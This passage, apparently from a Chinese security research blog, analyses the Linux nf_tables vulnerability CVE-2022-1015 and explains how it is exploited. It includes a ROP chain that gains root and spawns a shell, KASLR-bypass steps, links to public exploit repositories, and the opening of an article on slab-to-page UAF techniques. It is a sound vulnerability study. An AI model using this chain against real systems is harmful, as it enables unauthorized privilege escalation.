<h1 id="三、漏洞成因"><a href="#三、漏洞成因" class="headerlink" title="三、漏洞成因"></a>三、漏洞成因</h1><p>漏洞类型是整形溢出导致的栈溢出，同时存在于 nft_validate_register_store 及 nft_validate_register_load 两个函数，以下仅通过 nft_validate_register_load 进行解释，nft_validate_register_store 处的情况大同小异。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* net/netfilter/nf_tables_api.c */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nft_validate_register_load</span><span class="params">(<span class="keyword">enum</span> nft_registers reg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 这里检查是否在读取 verdict register， 这是不被允许的</span></span><br><span class="line">	<span class="keyword">if</span> (reg &lt; NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (len == <span class="number">0</span>) <span class="comment">// len 不可以是 0</span></span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="comment">// 由于 reg 的范围没有限制好，导致整形溢出</span></span><br><span class="line">	<span class="keyword">if</span> (reg * NFT_REG32_SIZE + len &gt; sizeof_field(struct nft_regs, data))</span><br><span class="line">		<span class="keyword">return</span> -ERANGE;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于 reg 的范围没有限制好，导致 reg * NFT_REG32_SIZE + len 整形溢出。</p>
<p>reg 的取值范围分析可以看 nft_validate_register_load 的调用处：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* net/netfilter/nf_tables_api.c */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nft_parse_register_load</span><span class="params">(<span class="keyword">const</span> struct nlattr *attr, u8 *sreg, u32 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	u32 reg; <span class="comment">// 4 byte register variable</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	reg = nft_parse_register(attr); <span class="comment">// gets the register index from an attribute</span></span><br><span class="line">	err = nft_validate_register_load(reg, len); <span class="comment">// calls the validating function</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>) <span class="comment">// if the validating function didn't return an error everything is fine</span></span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	*sreg = reg; <span class="comment">// save the register index into sreg (a pointer that is provided as an argument)</span></span><br><span class="line">	<span class="comment">// sreg = source register -&gt; the register from which we read</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(nft_parse_register_load);</span><br></pre></td></tr></table></figure>

<p>可以看到 reg 来自 netlink 属性 attr，通过 nft_parse_register 函数解析出来，再传递给 nft_validate_register_load 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* net/netfilter/nf_tables_api.c */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	nft_parse_register - parse a register value from a netlink attribute</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *	@attr: netlink attribute</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *	Parse and translate a register value from a netlink attribute.</span></span><br><span class="line"><span class="comment"> *	Registers used to be 128 bit wide, these register numbers will be</span></span><br><span class="line"><span class="comment"> *	mapped to the corresponding 32 bit register numbers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">nft_parse_register</span><span class="params">(<span class="keyword">const</span> struct nlattr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> reg;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// from include/uapi/linux/netfilter/nf_tables.h</span></span><br><span class="line">	<span class="comment">// NFT_REG_SIZE = 16 (16 bytes)</span></span><br><span class="line">	<span class="comment">// NFT_REG32_SIZE = 4 (4 bytes)</span></span><br><span class="line">	reg = ntohl(nla_get_be32(attr));</span><br><span class="line">	<span class="keyword">switch</span> (reg) &#123;</span><br><span class="line">	<span class="keyword">case</span> NFT_REG_VERDICT...NFT_REG_4:</span><br><span class="line">		<span class="keyword">return</span> reg * NFT_REG_SIZE / NFT_REG32_SIZE; </span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 nft_parse_register 中，明显没有对 reg 范围做任何限制，传入在 NFT_REG_VERDICT…NFT_REG_4 之外的值，函数最终都会返回 reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00，也就是 reg - 4。</p>
<p>最终，nft_parse_register_load 传回的 reg 会作为 index 用于访问 nft_do_chain 函数中的 nft_regs 局部变量，导致栈溢出。由于 nft_validate_register_store 及 nft_validate_register_load 两个函数都存在漏洞，因此可以同时越界读和写 nft_regs 之后的栈内存。</p>
<h1 id="四、EXP思路"><a href="#四、EXP思路" class="headerlink" title="四、EXP思路"></a>四、EXP思路</h1><p>EXP 中存在大量的算术运算计算各种地址位移，所针对的是特定的漏洞及特定的内核映像，在此谈论这些意义不大，因此本文只谈通用的思路。想要更细致研究的话可以参考 EXP 仓库：</p>
<p>https://github.com/pqlx/CVE-2022-1015</p>
<p>https://github.com/ysanatomic/CVE-2022-1015</p>
<p>通常，由于 canary 的存在，memcpy 等函数引发的栈内存越界写会难以利用，因为 memcpy 的起始地址通常是某个局部变量，要覆写到返回地址则必定会覆写 canary。这个漏洞可以利用的原因就是越界读写的起始地址可以通过传入的 reg 值设定，因此可以越过 canary，从 canary 之后、返回地址之前的地址开始覆写。</p>
<h2 id="4-1-泄露内核地址"><a href="#4-1-泄露内核地址" class="headerlink" title="4.1 泄露内核地址"></a>4.1 泄露内核地址</h2><p>首先通过动态调试寻找栈上的内核地址，再通过 nft_bitwise 这一 expression 越界读取该范围的内存，保存进 nft_regs 的正常范围内存内，这样才能通过 nft_payload_set 将 nft_regs 正常范围内存的内容复制到数据包中，经由用户态的 socket 接收该数据包获取到内核地址，以绕过 KASLR 保护。</p>
<h2 id="4-2-代码执行"><a href="#4-2-代码执行" class="headerlink" title="4.2 代码执行"></a>4.2 代码执行</h2><p>通过 nft_payload 将通过数据包发送的 ROP 链复制到 nft_regs 的正常范围内存内，再通过 nft_bitwise 越界写以覆盖到返回地址。为了不覆写到 canary，起始地址必须限制在 canary 之后，返回地址之前。</p>
<p>ROP 链的构造如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// clearing interrupts</span></span><br><span class="line">payload[offset++] = kbase + cli_ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">// preparing credentials</span></span><br><span class="line">payload[offset++] = kbase + pop_rdi_ret; </span><br><span class="line">payload[offset++] = <span class="number">0x0</span>; <span class="comment">// first argument of prepare_kernel_cred</span></span><br><span class="line">payload[offset++] = kbase + prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="comment">// commiting credentials</span></span><br><span class="line">payload[offset++] = kbase + mov_rdi_rax_ret;</span><br><span class="line">payload[offset++] = kbase + commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="comment">// switching namespaces</span></span><br><span class="line">payload[offset++] = kbase + pop_rdi_ret;</span><br><span class="line">payload[offset++] = process_id;</span><br><span class="line">payload[offset++] = kbase + find_task_by_vpid;</span><br><span class="line">payload[offset++] = kbase + mov_rdi_rax_ret;</span><br><span class="line">payload[offset++]	= kbase + pop_rsi_ret;</span><br><span class="line">payload[offset++] = kbase + ini;</span><br><span class="line">payload[offset++] = kbase + switch_task_namespaces;</span><br><span class="line"></span><br><span class="line"><span class="comment">// returning to userland</span></span><br><span class="line">payload[offset++] = kbase + swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">payload[offset++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)spawnShell;</span><br><span class="line">payload[offset++] = user_cs;</span><br><span class="line">payload[offset++] = user_rflags;</span><br><span class="line">payload[offset++] = user_sp;</span><br><span class="line">payload[offset++] = user_ss;</span><br></pre></td></tr></table></figure>

<p>先清空 interrupt 标志位，屏蔽可屏蔽中断，防止 ROP 被打断。</p>
<p>之后通过调用 prepare_kernel_cred(0) 准备权限为 root 的进程 cred。prepare_kernel_cred 是内核中专门用来准备进程 cred 的，进程 cred 代表了进程的各种权限。当对 prepare_kernel_cred 传入的参数为 0 时，返回的就是 root 权限的进程 cred。</p>
<p>再通过调用 switch_task_namespaces(find_task_by_vpid(process_id), &amp;init_nsproxy) 将 EXP 进程的名称空间切换到 init_nsproxy。其中 process_id 为 EXP 进程的 pid，有许多办法可在用户态获取并保存下来，find_task_by_vpid 则会返回指定 pid 的 task_struct，init_nsproxy 为 init 进程也就是第一个进程的名称空间。由于使用 nf_tables 需要切换到新的 user + network 名称空间，所以这一步是必要的。当然，也可以在获得 root 权限后返回到用户态时再切换。</p>
<p>最后是返回到用户态，通过 swapgs; iret; 这一 gadget。需要在栈上依次准备好 IP、CS、EFLAGS、SP、SS 寄存器的内容，其中，IP 指向可弹出一个 shell 的函数，该函数通过调用 system(“/bin/sh”) 获得 shell。</p>
<h2 id="4-3-离开-softirq-上下文"><a href="#4-3-离开-softirq-上下文" class="headerlink" title="4.3 离开 softirq 上下文"></a>4.3 离开 softirq 上下文</h2><p>在漏洞发现者的 <a href="https://github.com/pqlx/CVE-2022-1015" target="_blank" rel="noopener">EXP</a> 中，在上一节的清空 interrupt 标志位操作后，还增加了一步离开 softirq 上下文的操作，这是因为在 EXP 作者的利用环境中，nft_do_chain 在 NET_RX_SOFTIRQ 类型 irqsoft 上下文中被调用。这一步不是必须的，但不执行这一步会让系统变得不稳定。</p>
<p>进入 softirq 的逻辑实现在 do_softirq 函数中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Macro to invoke __do_softirq on the irq stack. This is only called from</span></span><br><span class="line"><span class="comment"> * task context when bottom halves are about to be reenabled and soft</span></span><br><span class="line"><span class="comment"> * interrupts are pending to be processed. The interrupt stack cannot be in</span></span><br><span class="line"><span class="comment"> * use here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> do_softirq_own_stack()						\</span></span><br><span class="line">&#123;									\</span><br><span class="line">	__this_cpu_write(hardirq_stack_inuse, <span class="literal">true</span>);			\</span><br><span class="line">	call_on_irqstack(__do_softirq, ASM_CALL_ARG0);			\</span><br><span class="line">	__this_cpu_write(hardirq_stack_inuse, <span class="literal">false</span>);			\</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage __visible <span class="keyword">void</span> <span class="title">do_softirq</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __u32 pending;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_interrupt())</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    local_irq_save(flags);</span><br><span class="line"></span><br><span class="line">    pending = local_softirq_pending();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pending &amp;&amp; !ksoftirqd_running(pending))</span><br><span class="line">        do_softirq_own_stack();</span><br><span class="line"></span><br><span class="line">    local_irq_restore(flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage __visible <span class="keyword">void</span> __softirq_entry __do_softirq(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">end</span> = jiffies + MAX_SOFTIRQ_TIME;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> old_flags = current-&gt;flags;</span><br><span class="line">    <span class="keyword">int</span> max_restart = MAX_SOFTIRQ_RESTART;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">softirq_action</span> *<span class="title">h</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> in_hardirq;</span><br><span class="line">    __u32 pending;</span><br><span class="line">    <span class="keyword">int</span> softirq_bit;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Mask out PF_MEMALLOC as the current task context is borrowed for the</span></span><br><span class="line"><span class="comment">     * softirq. A softirq handled, such as network RX, might set PF_MEMALLOC</span></span><br><span class="line"><span class="comment">     * again if the socket is related to swapping.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    current-&gt;flags &amp;= ~PF_MEMALLOC;</span><br><span class="line">    pending = local_softirq_pending();</span><br><span class="line"></span><br><span class="line">    softirq_handle_begin();</span><br><span class="line">    in_hardirq = lockdep_softirq_start();</span><br><span class="line">	</span><br><span class="line">    account_softirq_enter(current);</span><br><span class="line"></span><br><span class="line">    restart:</span><br><span class="line">    <span class="comment">/* Reset the pending bitmask before enabling irqs */</span></span><br><span class="line">    set_softirq_pending(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    local_irq_enable();</span><br><span class="line"></span><br><span class="line">    h = softirq_vec;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((softirq_bit = ffs(pending))) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> vec_nr;</span><br><span class="line">        <span class="keyword">int</span> prev_count;</span><br><span class="line"></span><br><span class="line">        h += softirq_bit - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        vec_nr = h - softirq_vec;</span><br><span class="line">        prev_count = preempt_count();</span><br><span class="line"></span><br><span class="line">        kstat_incr_softirqs_this_cpu(vec_nr);</span><br><span class="line"></span><br><span class="line">        trace_softirq_entry(vec_nr);</span><br><span class="line">        h-&gt;action(h); <span class="comment">// &lt;---------- net_rx_action is called here</span></span><br><span class="line">        trace_softirq_exit(vec_nr);</span><br><span class="line">        <span class="keyword">if</span> (unlikely(prev_count != preempt_count())) &#123;</span><br><span class="line">            pr_err(<span class="string">"huh, entered softirq %u %s %p with preempt_count %08x, exited with %08x?\n"</span>,</span><br><span class="line">                    vec_nr, softirq_to_name[vec_nr], h-&gt;action,</span><br><span class="line">                    prev_count, preempt_count());</span><br><span class="line">            preempt_count_set(prev_count);</span><br><span class="line">        &#125;</span><br><span class="line">        h++;</span><br><span class="line">        pending &gt;&gt;= softirq_bit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!IS_ENABLED(CONFIG_PREEMPT_RT) &amp;&amp;</span><br><span class="line">        __this_cpu_read(ksoftirqd) == current)</span><br><span class="line">        rcu_softirq_qs();</span><br><span class="line"></span><br><span class="line">    local_irq_disable();</span><br><span class="line"></span><br><span class="line">    pending = local_softirq_pending();</span><br><span class="line">    <span class="keyword">if</span> (pending) &#123;</span><br><span class="line">        <span class="keyword">if</span> (time_before(jiffies, <span class="built_in">end</span>) &amp;&amp; !need_resched() &amp;&amp;</span><br><span class="line">            --max_restart)</span><br><span class="line">            <span class="keyword">goto</span> restart;</span><br><span class="line"></span><br><span class="line">        wakeup_softirqd();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    account_softirq_exit(current);</span><br><span class="line">    lockdep_softirq_end(in_hardirq);</span><br><span class="line">    softirq_handle_end();</span><br><span class="line">    current_restore_flags(old_flags, PF_MEMALLOC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 soft_irq 处理完毕后，通过 local_irq_disable() 关中断，再通过 softirq_handle_end() 调整 preempt_count，原来的系统调用栈在 do_softirq 函数中通过调用 do_softirq_own_stack 宏恢复，最后重新打开中断。</p>
<p>由于 softirq_handle_end() 被内联在 __do_softirq() 中，在此 <a href="https://github.com/pqlx/CVE-2022-1015" target="_blank" rel="noopener">EXP</a> 中，作者仅通过 ROP 将控制流引导至 __do_softirq() 调用 softirq_handle_end() 处，调整了 preempt_count，并称可以无副作用地离开 softirq 的上下文，回到进程上下文。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/" target="_blank" rel="noopener">How The Tables Have Turned: An analysis of two new Linux vulnerabilities in nf_tables</a></p>
<p><a href="https://ysanatomic.github.io/cve-2022-1015/" target="_blank" rel="noopener">CVE-2022-1015: A validation flaw in Netfilter leading to Local Privilege Escalation</a></p>
<p><a href="https://ysanatomic.github.io/netfilter_nf_tables/" target="_blank" rel="noopener">Dissecting the Linux Firewall: Introduction to Netfilter’s nf_tables</a></p>
<p><a href="https://www.digitalocean.com/community/tutorials/a-deep-dive-into-iptables-and-netfilter-architecture" target="_blank" rel="noopener">A Deep Dive into Iptables and Netfilter Architecture</a></p>
<p><a href="https://arthurchiao.art/blog/conntrack-design-and-implementation/" target="_blank" rel="noopener">Connection Tracking (conntrack): Design and Implementation Inside Linux Kernel</a></p>
<p><a href="https://www.kernel.org/doc/html/latest/userspace-api/netlink/intro.html" target="_blank" rel="noopener">Introduction to Netlink — The Linux Kernel documentation</a></p>
<p><a href="https://man7.org/linux/man-pages/man7/netlink.7.html" target="_blank" rel="noopener">netlink(7) - Linux manual page</a></p>
<p><a href="https://wiki.nftables.org/wiki-nftables/index.php/Portal:DeveloperDocs/nftables_internals" target="_blank" rel="noopener">Portal:DeveloperDocs/nftables internals - nftables wiki</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2023/02/06/cve-2022-1015/" data-id="cmd5slr2k000m0lo18hacf0ae" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2023/02/01/slabUaf-to-pageUaf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2023/02/01/slabUaf-to-pageUaf/" class="article-date">
  <time datetime="2023-02-01T14:00:00.000Z" itemprop="datePublished">2023-02-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2023/02/01/slabUaf-to-pageUaf/">Linux 内核利用技巧 Slab UAF to Page UAF</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author: 熊潇 of <a href="https://www.iceswordlab.com/about/" target="_blank" rel="noopener">IceSword Lab</a></p>
<p>本文研究了内核编译选项 <code>CONFIG_SLAB_MERGE_DEFAULT</code> 对 <code>kmem_cache</code> 分配的影响.</p>
<p>以及开启该配置的时候, slab UAF 的一种利用方案  (<a href="https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/" target="_blank" rel="noopener">方案来源</a>, 本文内容基于 Linux-5.10.90).</p>
<p>阅读前, 需要对 slab/slub, Buddy system 有基本的了解.</p>
<ul>
<li>Part. 1: 源码分析</li>
<li>Part. 2: <code>CONFIG_SLAB_MERGE_DEFAULT</code> 配置对比测试</li>
<li>Part. 3: 跨 slab 的 UAF 利用示例</li>
</ul>
<p>Keyword: slab/slub | CONFIG_SLAB_MERGE_DEFAULT | Linux kernel exploit</p>
<h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part. 1"></a>Part. 1</h2><p>创建 <code>struct kmem_cache</code> 的时候，有两种情况:</p>
<ul>
<li><code>__kmem_cache_alias</code> :  跟现有的共用（mergeable）</li>
<li><code>create_cache</code> : 创建一个新的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">kmem_cache_create(..)</span><br><span class="line">	kmem_cache_create_usercopy(..)</span><br><span class="line">        <span class="keyword">if</span> (!usersize) <span class="comment">// usersize == 0</span></span><br><span class="line">            s = __kmem_cache_alias(name, <span class="built_in">size</span>, align, flags, ctor); <span class="comment">// s 为 NULL 才会创建新的 slab</span></span><br><span class="line">        <span class="keyword">if</span> (s)</span><br><span class="line">            <span class="keyword">goto</span> out_unlock;</span><br><span class="line">		create_cache()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进入 `__kmem_cache_alias` 看看</span></span><br><span class="line">__kmem_cache_alias(..)</span><br><span class="line">    <span class="comment">// 检查 CONFIG_SLAB_MERGE_DEFAULT 配置；</span></span><br><span class="line">    <span class="comment">// 如果开启了，则通过 sysfs_slab_alias 找到已经创建的相同大小的 slab 作为替代</span></span><br><span class="line">	s = find_mergeable(..)</span><br><span class="line">		list_for_each_entry_reverse(s, &amp;slab_caches, <span class="built_in">list</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (slab_unmergeable(s)) <span class="comment">// slab_nomerge 为 true 时 return 1;</span></span><br><span class="line">                <span class="keyword">continue</span>; </span><br><span class="line">             ...</span><br><span class="line">             <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">// slab_nomerge 为 true 的时候返回 NULL</span></span><br><span class="line">    <span class="keyword">if</span>(s)           </span><br><span class="line">       ... </span><br><span class="line">	   sysfs_slab_alias(..)</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CONFIG_SLAB_MERGE_DEFAULT=y -&gt; slab_nomerge == false</span></span><br><span class="line"><span class="comment">// CONFIG_SLAB_MERGE_DEFAULT=n -&gt; slab_nomerge == true</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span> slab_nomerge = !IS_ENABLED(CONFIG_SLAB_MERGE_DEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://cateee.net/lkddb/web-lkddb/SLAB_MERGE_DEFAULT.html</span></span><br><span class="line"><span class="comment">// CONFIG_SLAB_MERGE_DEFAULT: Allow slab caches to be merged</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// For reduced kernel memory fragmentation, slab caches can be merged </span></span><br><span class="line"><span class="comment">// when they share the same size and other characteristics. </span></span><br><span class="line"><span class="comment">// This carries a risk of kernel heap overflows being able to </span></span><br><span class="line"><span class="comment">// overwrite objects from merged caches (and more easily control cache layout), </span></span><br><span class="line"><span class="comment">// which makes such heap attacks easier to exploit by attackers.</span></span><br></pre></td></tr></table></figure>


<h2 id="Part-2"><a href="#Part-2" class="headerlink" title="Part.2"></a>Part.2</h2><p>测试 <code>CONFIG_SLAB_MERGE_DEFAULT</code> 的影响</p>
<p>Host 主机(开启了配置)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─[$] uname -r</span><br><span class="line"><span class="number">5.15</span><span class="number">.0</span><span class="number">-52</span>-generic</span><br><span class="line"></span><br><span class="line">└─[$] cat /boot/<span class="built_in">config</span>-$(uname -r) |grep CONFIG_SLAB_MERGE_DEFAULT      </span><br><span class="line">CONFIG_SLAB_MERGE_DEFAULT=y</span><br></pre></td></tr></table></figure>

<p>VM (未开启配置): </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ uname -r</span><br><span class="line"><span class="number">5.10</span><span class="number">.90</span></span><br><span class="line"></span><br><span class="line">└─[$] cat .<span class="built_in">config</span>|grep CONFIG_SLAB_MERGE_DEFAULT       </span><br><span class="line"># CONFIG_SLAB_MERGE_DEFAULT is <span class="keyword">not</span> <span class="built_in">set</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>code</p>
